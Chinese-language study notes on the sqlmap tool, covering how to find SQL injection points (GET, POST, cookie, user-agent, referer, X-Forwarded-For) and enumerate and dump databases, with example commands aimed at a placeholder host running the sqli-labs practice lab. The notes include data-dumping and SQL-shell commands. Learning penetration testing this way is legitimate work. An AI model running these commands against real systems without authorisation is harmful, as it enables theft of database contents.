# sqmap学习笔记

标签（空格分隔）： 未分类

---
学习思路

找注入点
	get 型  需要带参数
	post型  需要带参数
		需要登录的  需要对的账号和密码
	cookie
	user_agent
	referer

利用注入点
	获取库名 
	获取表名  
	获取字段名  
	获取数据


帮助文档
	基本帮助信息
	python sqlmap.py -h
	高级帮助信息
	python sqlmap.py -hh
	显示版本
	python sqlmap.py --version


常用命令
	探测有那些注入漏洞
		python sqlmap.py -u url  

	默认确认： --batch
	清除缓存： --purge
	
	获取库名   --dbs
	获取表名  --tables
	获取字段名   --columns
	获取数据
		指定 拖库：--dump
		全部 拖库：--dump-all
	执行SQL语句  --sql-shell
	
	指定库名  -D  库名
	指定表名  -T  表名
	指定列名  -C  列名
	
	查看当前用户名：  --current-user
	查看当前数据库名：--current-db


	要执行的测试级别(1-5, default 1)：--level      [ 2 cookie 3 ua信息 ]
		1、默认是没有cookie，ua, referer ....测试范围的
		2、直接指定cookie 或 user_agent：
			-p cookie
			-p user-agent


​	

	批量测试多台目标服务器
		使用burp抓包放到一个文件里面 做探测：-l
		从文件加载HTTP请求 做探测：-r


------------------案例------------------------
1、帮助文档
python sqlmap.py -hh

2、探测存在什么类型的sql注入
python sqlmap.py -u http://xxx.xxx.xxx.xxx/sqli/Less-1/?id=1
python sqlmap.py -u http://xxx.xxx.xxx.xxx/sqli/Less-1/?id=1
python sqlmap.py -u http://xxx.xxx.xxx.xxx/sqli/Less-1/?id=1 --batch
python sqlmap.py -u http://xxx.xxx.xxx.xxx/sqli/Less-1/?id=1 --batch --purge

3、枚举数据
python sqlmap.py -u http://xxx.xxx.xxx.xxx/sqli/Less-1/?id=1 --batch --dbs
python sqlmap.py -u http://xxx.xxx.xxx.xxx/sqli/Less-1/?id=1 --batch --current-db
python sqlmap.py -u http://xxx.xxx.xxx.xxx/sqli/Less-1/?id=1 --batch -D security --tables
python sqlmap.py -u http://xxx.xxx.xxx.xxx/sqli/Less-1/?id=1 --batch -D security -T users --columns
python sqlmap.py -u http://xxx.xxx.xxx.xxx/sqli/Less-1/?id=1 --batch -D security -T users --dump 
python sqlmap.py -u http://xxx.xxx.xxx.xxx/sqli/Less-1/?id=1 --batch -D security -T users --dump --start 1 --stop 2

python sqlmap.py -u http://xxx.xxx.xxx.xxx/sqli/Less-1/?id=1 --batch  --current-user
python sqlmap.py -u http://xxx.xxx.xxx.xxx/sqli/Less-1/?id=1 --batch  --sql-shell
q  退出


------------------------------------------------------------

post类型注入：
python sqlmap.py -u http://xxx.xxx.xxx.xxx/sqli/Less-11/ --data="uname=aa&passwd=aa&submit=submit" --batch

cookie类型注入：
python sqlmap.py -u http://xxx.xxx.xxx.xxx/index.php --batch --cookie="security_session_verify=f0e4b8ffab48080e868a86a976c26451; PHPSESSID=rn09ct1bt0d221intqs65vb0b7; User=admin" --level 2
第二种方法：
python sqlmap.py -u http://xxx.xxx.xxx.xxx/index.php --batch --cookie="security_session_verify=f0e4b8ffab48080e868a86a976c26451; PHPSESSID=rn09ct1bt0d221intqs65vb0b7; User=admin" -p cookie 

user-agent注入：
python sqlmap.py -u http://xxx.xxx.xxx.xxx/ --batch -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" -p user-agent


xff注入
python sqlmap.py -u http://xxx.xxx.xxx.xxx/ --batch -l xff.txt -p x-forwarded-for --dbs

referer注入
python sqlmap.py -u url --batch --data="uname=admin&passwd=admin&submit=Submit" -p refrere
----------------------------
其他参数
使用-r指定目标：
python sqlmap.py -r request.txt --batch
使用-l指定目标：
python sqlmap.py -l request.txt --batch --purge















